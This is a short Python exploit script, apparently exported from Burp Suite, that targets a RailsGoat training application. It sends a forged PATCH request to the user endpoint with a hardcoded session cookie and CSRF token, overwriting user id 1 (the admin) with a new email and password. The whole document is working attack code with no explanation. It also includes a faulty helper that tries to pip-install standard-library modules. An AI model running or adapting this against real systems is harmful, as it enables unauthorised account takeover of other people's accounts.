import pip

def import_or_install(package):
    try:
        __import__(package)
    except ImportError:
        pip.main(['install', package])

import_or_install('requests')
import_or_install('sys')
import_or_install('argparse')
import_or_install('json')

import requests
import sys
import argparse
import json 


parser = argparse.ArgumentParser()
parser.add_argument("-U", "--Url", required=True)
args = parser.parse_args()



import requests

burp0_url = args.Url + ":443/users/2.json"
burp0_cookies = {"_ga": "GA1.2.1513446910.1614257248", "_railsgoat_session": "eUtoK0hJNkEzNVkveWpzQWQ3enV3U25YR0lWQ0lPNG11a1Mzd0ZpbWtsLzRlbldZS3lPbWQ5RlYxWDlNM3ZkTXFTM3VtY1hna0NzbHIwNHIxSkxXbFJNd3IxZXdzWnFzWXhVTkszS0pHYU85ZnlGbE5paklEOTkyK1RBRkRTWUpFNWxqTkNlTG1YOVRVVnFSTnZCRXVPa2N0RFlwM2toTURTN3gwMG9BWTJrMzcydzBFbHdGcEVTZzZ3TjJxbDVBTXZUb0pSeUJBcFlyNTcwN2FyUWRvZz09LS1PWXlvL0hwTEFOSEREYkIvZVVQQ3lnPT0%3D--f6bf16240b3815c54cedf95e1ae9260fc0cebdc0"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://" + args.Url, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://" + args.Url, "Connection": "close"}
burp0_data = {"utf8": "\xe2\x9c\x93", "_method": "patch", "authenticity_token": "GI8G7bBwTKl8ZaWYvIlYUGVLI6y8+n9dJUMHxnQepafA0IqQJ8tac3IkSzN9BobpAq5BvA6wHuVpc+ei2f+lMQ==", "user[id]": "1", "user[email]": "admin@metacorp.com", "user[password]": "testeteste", "user[password_confirmation]": "testeteste"}
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
